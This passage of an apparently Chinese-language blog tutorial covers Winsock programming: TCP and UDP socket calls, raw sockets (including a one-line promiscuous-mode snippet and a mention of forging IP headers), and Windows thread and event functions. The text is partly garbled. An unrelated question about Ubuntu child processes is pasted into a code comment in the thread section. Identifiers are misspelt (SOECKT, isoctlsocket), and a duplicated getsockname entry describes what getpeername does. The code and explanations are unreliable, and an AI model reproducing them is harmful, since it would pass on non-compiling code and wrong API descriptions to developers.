href="https://baike.sogou.com/v397785.htm?fromTitle=WSASocket(">socket WSASocket()</a>)：创建套接字。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建套接字</span></span><br><span class="line"><span class="function">socket WSAAPI <span class="title">socket</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> af, <span class="comment">// 确定套接字通信地址族（例：AF_INET）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> type, <span class="comment">// 套接字类型（例：SOCK_STREAM）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> protocol, <span class="comment">// 指定通信协议（例：IPPROTO_TCP）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>;</span><br><span class="line"><span class="comment">// 非负值表示成功，-1表示失败，可以用WSAGetLastError()获得失败码。</span></span><br><span class="line">ConnectSocket = <span class="built_in">socket</span>(ptr-&gt;ai_family, ptr-&gt;ai_socktype, ptr-&gt;ai_protocol);</span><br><span class="line"><span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭套接字</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">closesocket</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// 非负值表示成功，-1表示失败，可以用WSAGetLastError()获得失败码。</span></span><br><span class="line"><span class="built_in">closesocket</span>(ConnectSocket);</span><br></pre></td></tr></table></figure></li><li><p>获取地址</p><blockquote><p><a href="https://baike.sogou.com/v63124712.htm?fromTitle=getaddrinfo">getaddrinfo()</a>：获得主机地址。</p><p><a href="https://blog.csdn.net/tomatolee221/article/details/89641975">gethostbyname()</a>：依据主机名获得IP地址。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将套接字与本地地址关联（服务器端）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bind</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="keyword">struct</span> sockaddr* name, <span class="comment">// 地址参数，被声明为一个指向sockaddr结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> namelen <span class="comment">// 地址结构大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 地址或端口填0将由操作系统自动选择</span></span></span><br><span class="line"><span class="function">iResult </span>= <span class="built_in">bind</span>(ListenSocket, result-&gt;ai_addr, (<span class="type">int</span>)result-&gt;ai_addrlen);</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    <span class="built_in">freeaddrinfo</span>(result);</span><br><span class="line">    <span class="built_in">closesocket</span>(ListenSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得套接字关联的本地端点地址</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getsockname</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="keyword">struct</span> sockaddr* name, <span class="comment">// 地址参数，被声明为一个指向sockaddr结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> *namelen <span class="comment">// 地址结构大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 该函数用于对本地套接字进行bind()或connect()后获得这个套接字的地址信息。</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 获得套接字关联的本地端点地址 </span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getsockname</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">__out <span class="keyword">struct</span> sockaddr* name, <span class="comment">// 地址参数，被声明为一个指向sockaddr结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">__inout <span class="type">int</span>* namelen <span class="comment">// 地址结构大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 该函数用于获得已连接套接字的对等方端点地址，获得的端点地址保存在name中返回。</span></span></span><br></pre></td></tr></table></figure></li><li><p>连接请求</p><blockquote><p><a href="https://www.cnblogs.com/yangwenxin/p/6601194.html">socket_listen里面第二个参数backlog的用处</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 连接服务器</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">connect</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="keyword">struct</span> sockaddr* name, <span class="comment">// 地址参数，被声明为一个指向sockaddr结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> namelen <span class="comment">// 地址结构大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">iResult = <span class="built_in">connect</span>(ConnectSocket,ptr-&gt;ai_addr,(<span class="type">int</span>)ptr-&gt;ai_addrlen);</span><br><span class="line"><span class="keyword">if</span>(iResult == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    ConnectSocket = INVALID_SOCKET;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听等待TCP连接</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">listen</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> backlog, <span class="comment">// 等待握手队列长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function">iResult </span>= <span class="built_in">listen</span>(ListenSocket, SOMAXCONN);</span><br><span class="line"><span class="keyword">if</span>(iResult == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;listen failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    <span class="built_in">closesocket</span>(ListenSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于从已完成连接的连接请求队列中返回一个已完成连接的客户请求</span></span><br><span class="line"><span class="function">SOECKT <span class="title">accept</span>    </span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCEKT s, <span class="comment">// 已绑定并设置为“监听”状态的套接字（该套接字不可以用来通信）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out <span class="keyword">struct</span> sockaddr* addr, <span class="comment">// 被声明为一个指向sockaddr结构的指针（客户端IP，不需要输入NULL）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __inout <span class="type">int</span> *addrlen <span class="comment">// 地址结构长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 该函数会返回另一个用于数据传输的套接字，被称为已连接套接字，负责与本次连接的客户通信。</span></span></span><br><span class="line"><span class="function">ClientSocket </span>= <span class="built_in">accept</span>(ListenSocket,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ClientSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;accept failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    <span class="built_in">closesocket</span>(ListenSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>传输数据</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 发送数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">send</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 已连接套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="type">char</span>* buf, <span class="comment">// 要发送的字节序列</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> len, <span class="comment">// 发送的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> flags, <span class="comment">// 改变套接字调用的默认行为方式。默认为0。MSG_DONTROUTE(不经过本地的路由机制)，MSG_OOB(带外数据)</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// 该函数返回实际发送了的字节总数</span></span><br><span class="line"><span class="comment">// 在流式套接字中服务器调用accept()/客户端调用connect()函数完成了地址绑定，所以不用地址</span></span><br><span class="line">iResult = <span class="built_in">send</span>(ConnectSocket,sendbuf,(<span class="type">int</span>)<span class="built_in">strlen</span>(sendbuf),<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(iResult == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;send failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">recv</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 已连接套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out <span class="type">char</span>* buf, <span class="comment">// 接受缓冲区</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> len, <span class="comment">// 接受缓冲区的字节长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> flags <span class="comment">// 改变套接字调用的默认行为方式。默认为0。MSG_DONTROUTE(不经过本地的路由机制)，MSG_OOB(带外数据)</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 该函数返回实际接收了的字节总数。</span></span></span><br><span class="line"><span class="function">iResult </span>= <span class="built_in">recv</span>(ConnectSocket,recvbuf,recvbuflen,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(iResult &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bytes received: %d\n&quot;</span>, iResult);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(iResult == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;recv failed with error: %d\n&quot;</span>,<span class="built_in">WSAGetLastError</span>());</span><br></pre></td></tr></table></figure></li><li><p>TCP参数</p><p><code>socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</code></p></li></ul><h3 id="5-UDP函数"><a href="#5-UDP函数" class="headerlink" title="5 UDP函数"></a>5 UDP函数</h3><ul><li><p>UDP通信过程</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 服务器进程</span></span><br><span class="line"><span class="comment">// Windows Sockets DLL初始化，协商版本号</span></span><br><span class="line"><span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="comment">// （不同于TCP）创建套接字，指定使用UDP通信</span></span><br><span class="line"><span class="built_in">socket</span>();</span><br><span class="line"><span class="comment">// 指定本地地址和通信端口</span></span><br><span class="line"><span class="built_in">getaddrinfo</span>();<span class="built_in">bind</span>();</span><br><span class="line"><span class="comment">// （不同于TCP）等待客户连接请求</span></span><br><span class="line"><span class="comment">// （不同于TCP）进行数据传输</span></span><br><span class="line"><span class="built_in">recvfrom</span>();<span class="built_in">sendto</span>();</span><br><span class="line"><span class="comment">// 关闭套接字</span></span><br><span class="line"><span class="built_in">shutdown</span>();<span class="built_in">closesocket</span>();</span><br><span class="line"><span class="comment">// 结束对Windows Sockets DLL的使用，释放资源</span></span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端进程</span></span><br><span class="line"><span class="comment">// Windows Sockets DLL初始化，协商版本号</span></span><br><span class="line"><span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="comment">// （不同于TCP）创建套接字，指定使用UDP通信</span></span><br><span class="line"><span class="built_in">socket</span>();</span><br><span class="line"><span class="comment">// 指定服务器地址和通信端口</span></span><br><span class="line"><span class="built_in">getaddrinfo</span>();</span><br><span class="line"><span class="comment">// （不同于TCP）向服务器发送连接请求</span></span><br><span class="line"><span class="comment">// （不同于TCP）进行数据传输</span></span><br><span class="line"><span class="built_in">recvfrom</span>();<span class="built_in">sendto</span>();</span><br><span class="line"><span class="comment">// 关闭套接字</span></span><br><span class="line"><span class="built_in">shutdown</span>();<span class="built_in">closesocket</span>();</span><br><span class="line"><span class="comment">// 结束对Windows Sockets DLL的使用，释放资源</span></span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br></pre></td></tr></table></figure></li><li><p>连接模式</p><ul><li>connect() 连接，不同于TCP三次握手，仅仅是绑定IP和port，不会产生网络活动。</li><li>connect() 重新绑定套接字可以更新IP和port。</li><li>再次调用connect() 时，若之前把套接字地址结构设置成AF_UNSPEC，后续的send()和recv()将出错。</li></ul></li><li><p>传输数据</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 发送数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sendto</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 已连接套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="type">char</span>* buf, <span class="comment">// 要发送的字节序列</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> len, <span class="comment">// 发送的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> flags, <span class="comment">// 改变套接字调用的默认行为方式。默认为0。MSG_DONTROUTE(不经过本地的路由机制)，MSG_OOB(带外数据)</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="keyword">struct</span> sockaddr* to, <span class="comment">// 目的地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> tolen <span class="comment">// 地址结构长度</span></span></span></span><br><span class="line"><span class="params"><span class="function"> )</span></span>;</span><br><span class="line"><span class="comment">// 该函数返回实际发送了的字节总数</span></span><br><span class="line"><span class="comment">// 在数据报套接字中则需要输入地址</span></span><br><span class="line">iResult = <span class="built_in">sendto</span>(ConnectLessSocket,sendbuf,(<span class="type">int</span>)<span class="built_in">strlen</span>(sendbuf),<span class="number">0</span>,result-&gt;ai_addr,(<span class="type">int</span>)result-&gt;ai_addrlen);</span><br><span class="line"><span class="keyword">if</span>(iResult == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sendto failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectLessSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">recvfrom</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in SOCKET s, <span class="comment">// 已连接套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out <span class="type">char</span>* buf, <span class="comment">// 接受缓冲区</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> len, <span class="comment">// 接受缓冲区的字节长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> flags <span class="comment">// 改变套接字调用的默认行为方式。默认为0。MSG_DONTROUTE(不经过本地的路由机制)，MSG_OOB(带外数据)</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out <span class="keyword">struct</span> sockaddr* from, <span class="comment">// 源地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in_outopt_ <span class="type">int</span> *fromlen <span class="comment">// 地址结构长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 该函数返回实际接收了的字节总数</span></span></span><br><span class="line"><span class="function">iResult </span>= <span class="built_in">recvfrom</span>(ConnectLessSocket,recvbuf, recvbuflen,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(iResult &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bytes received: %d\n&quot;</span>, iResult);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(iResult == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;recv failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br></pre></td></tr></table></figure></li><li><p>UDP参数</p><p><code>socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</code></p></li></ul><h3 id="6-原始套接字函数"><a href="#6-原始套接字函数" class="headerlink" title="6 原始套接字函数"></a>6 原始套接字函数</h3><ul><li><p>作用</p><blockquote><p>作用于网络层。</p></blockquote><ol><li>发送和接受ICMP IGMP等包。</li><li>发送和接受内核 不处理其协议字段的IPv4数据包。实现非常规协议OSPF。</li><li>控制IPv4首部，伪造IP地址。</li></ol></li><li><p>常用协议</p></li></ul><div class="table-container"><table><thead><tr><th>协议名</th><th>值</th><th>协议</th></tr></thead><tbody><tr><td>IPPROTO_IP</td><td>0</td><td>IP协议</td></tr><tr><td>IPPROTO_ICMP</td><td>1</td><td>ICMP协议</td></tr><tr><td>IPPROTO_IGMP</td><td>2</td><td>IGMP协议</td></tr><tr><td>IPPROTO_RFCOMM</td><td>3</td><td>PFCOMM协议</td></tr><tr><td>IPPROTO_IPv4</td><td>4</td><td>IPv4协议</td></tr><tr><td>IPPROTO_TCP</td><td>6</td><td>TCP协议</td></tr><tr><td>IPPROTO_UDP</td><td>17</td><td>UDP协议</td></tr><tr><td>IPPROTO_IPv6</td><td>41</td><td>IPv6协议</td></tr><tr><td>IPPROTO_ICMPv6</td><td>58</td><td>ICMPv6协议</td></tr><tr><td>IPPROTO_RAW</td><td>255</td><td>RAW协议</td></tr></tbody></table></div><ul><li><p>准备工作</p><blockquote><p>选项 IP_HDRINCL</p><p>开启可以对IP首部进行控制。<br>关闭则只能对下一协议首部和协议数据控制。</p></blockquote><ul><li>本地地址关联——bind()（不常见）</li><li>远端地址关联——connect()（不常见）</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置网卡混杂模式</span></span><br><span class="line">u_long optival = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">isoctlsocket</span>(s,SIO_RCVALL,&amp;optival);</span><br></pre></td></tr></table></figure></li><li><p>IP参数</p><blockquote><p>端口号填0 ，网络层无端口的概念。</p></blockquote><p><code>socket (AF_INET , SOCK_RAW , IPPROTO_ICMP);</code></p></li></ul><h3 id="7-多线程函数"><a href="#7-多线程函数" class="headerlink" title="7 多线程函数"></a>7 多线程函数</h3><h4 id="7-1-线程函数"><a href="#7-1-线程函数" class="headerlink" title="7.1 线程函数"></a>7.1 线程函数</h4><ul><li><p>线程创建</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 线程函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFunc</span><span class="params">(LPVOID lpvThreadParm)</span></span>;</span><br><span class="line"><span class="comment">// 线程创建</span></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T dwStackSize, <span class="comment">// 0</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress, <span class="comment">// 上面线程名 ThreadFunc</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter, <span class="comment">// 上面线程参数 lpvThreadParm</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags, <span class="comment">// 0</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPDWORD lpThreadId <span class="comment">// 0</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// 线程创建成功，返回线程的句柄，失败，返回值是-1。</span></span><br><span class="line"><span class="comment">// 同样的线程函数只需要初始化一个线程函数名，每次调用返回不同的句柄以此来区分线程。</span></span><br></pre></td></tr></table></figure></li><li><p>线程操作</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1、暂停线程</span></span><br><span class="line"><span class="function">DWORD <span class="title">SuspendThread</span><span class="params">(HANDLE hThread)</span></span>;</span><br><span class="line"><span class="comment">// hThread：要暂停线程的句柄，一般要在线程外执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、恢复线程我在Ubuntu中使用C进行网络编程。我现在有一个问题，请问有可能是什么原因？我的服务器主进程创建了两个子进程A和B。我先创建了A再创建了B。我的B可以send给A，但是我的A无法send给B。我可以在A中找到B的描述符，但是访问不到描述符的资源。请问该怎么办。</span></span><br><span class="line"><span class="function">DWORD <span class="title">ResumeThread</span><span class="params">(HANDLE hThread)</span></span>;</span><br><span class="line"><span class="comment">// hThread：要恢复线程的句柄，一般要在线程外执行（恢复后线程输入的参数会出错）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、使线程睡眠</span></span><br><span class="line"><span class="function">VOID <span class="title">Sleep</span><span class="params">(DWORD dwMilliseconds)</span></span>;</span><br><span class="line"><span class="comment">// dwMilliseconds：线程睡眠的时间，单位是毫秒，要在线程内执行</span></span><br></pre></td></tr></table></figure></li><li><p>终止线程</p><ol><li>线程函数返回（最好）。</li><li>通过调用ExitThread函数，线程将自行撤销。</li><li>同一个进程的另一个线程调用TerminateThread函数。</li><li>包含线程的进程终止。</li></ol><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 线程内退出</span></span><br><span class="line"><span class="function">VOID <span class="title">ExitThread</span><span class="params">(DWORD dwExitCode)</span></span>;</span><br><span class="line"><span class="comment">// dwExitCode：线程退出码，根据需要设置，一般设为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程外终止</span></span><br><span class="line"><span class="function">BOOL <span class="title">TerminateThread</span><span class="params">(HANDLE hThread,DWORD dwExitCode)</span></span>;</span><br><span class="line"><span class="comment">// hThread：要终止的线程句柄</span></span><br><span class="line"><span class="comment">// dwExitCode：线程退出码，根据需要设置</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="7-2-线程通信"><a href="#7-2-线程通信" class="headerlink" title="7.2 线程通信"></a>7.2 线程通信</h4><ul><li><p>临界段</p><ul><li>临界段：以原子方式执行关键代码段。</li><li>关键代码段：是指一小段代码，同一个时刻，只能有一个线程具有访问权。</li><li>多个线程访问同一个临界区的原则<ol><li>一次最多只能一个线程停留在临界区内。</li><li>不能让一个线程无限地停留在临界区内，否则其它线程将不能进入该临界区。</li></ol></li></ul></li><li><p>临界段的使用</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.首先定义一个临界段对象（通常全局变量）</span></span><br><span class="line">CRITICAL_SECTION  cs;</span><br><span class="line"><span class="comment">// 2.在main函数中临界段对象初始化</span></span><br><span class="line"><span class="built_in">InitializeCriticalSection</span>(&amp;cs);</span><br><span class="line"><span class="comment">// 3.在要执行关键代码进入临界段</span></span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;cs);</span><br><span class="line"><span class="comment">// 4.在执行完关键代码离开临界段</span></span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;cs);</span><br><span class="line"><span class="comment">// 5.释放临界段对象</span></span><br><span class="line"><span class="built_in">DeleteCriticalSection</span>(&amp;cs);</span><br></pre></td></tr></table></figure></li><li><p>事件</p><blockquote><p>在Windows环境下，事件被理解为可以通过代码响应或处理的操作。</p><p>事件主要用于标识一个操作是否已经完成。</p><p>有两种不同类型的事件对象，一种是人工重置的事件，另一种是自动重置的事件。当人工重置的事件得到通知时，等待该事件的所有线程均变为可调度线程。当一个自动重置的事件得到通知时，等待该事件的线程中只有一个线程变为可调度线程。</p></blockquote></li><li><p>事件对象属于内核对象，它包含三个主要内容</p><ol><li>一个使用计数。</li><li>一个布尔值，指明该事件是自动复位事件(false)，还是人工复位事件(true)。</li><li>一个布尔值，指明该事件是已通知状态(true)，还是未通知状态(false) 。</li></ol></li><li><p>事件的使用</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.创建事件</span></span><br><span class="line"><span class="function">HANDLE WINAPI <span class="title">CreateEvent</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">BOOL bManualReset,</span></span></span><br><span class="line"><span class="params"><span class="function">BOOL bInitialState,</span></span></span><br><span class="line"><span class="params"><span class="function">LPCTSTR lpName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// lpEventAttributes：NULL</span></span><br><span class="line"><span class="comment">// bManualReset：告诉系统是创建一个人工重置的事件（TRUE）还是创建一个自动重置的事件（FALSE）。常设置TRUE；</span></span><br><span class="line"><span class="comment">// bInitialState：用于指明该事件是要初始化为已通知状态（TRUE）还是未通知状态（FALSE）。常设置为FALSE;</span></span><br><span class="line"><span class="comment">// lpName：事件对象的名字，是一个字符串，名字对大小写敏感。</span></span><br><span class="line"><span class="comment">// 自动重置: SetEvent之后, 事件自动重置为未触发状态。</span></span><br><span class="line"><span class="comment">// 手动重置 : SetEvent之后, 需要调用ResetEvent事件才置为未触发状态。</span></span><br><span class="line"><span class="comment">// 区别 : 当一个手动重置事件被触发的时候, 正在等待该事件的所有线程都变为可调度状态; 当一个自动重置事件被触发的时候, 只有一个正在等待该事件的线程会变为可调度状态.系统并不会保证会调度其中的哪个线程, 剩下的线程将继续等待.这样, 可以在在每个线程函数返回之前调用SetEvent。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.将事件改为已通知状态</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">SetEvent</span><span class="params">(HANDLE hEvent)</span></span>;</span><br><span class="line"><span class="comment">// 3.将该事件改为未通知状态</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ResetEvent</span><span class="params">(HANDLE hEvent)</span></span>;</span><br><span class="line"><span class="comment">// 4.等待单个事件变为通知态</span></span><br><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(HANDLE hObject,DWORD dwMilliseconds)</span></span>;</span><br><span class="line"><span class="comment">// hObject：事件的句柄</span></span><br><span class="line"><span class="comment">// 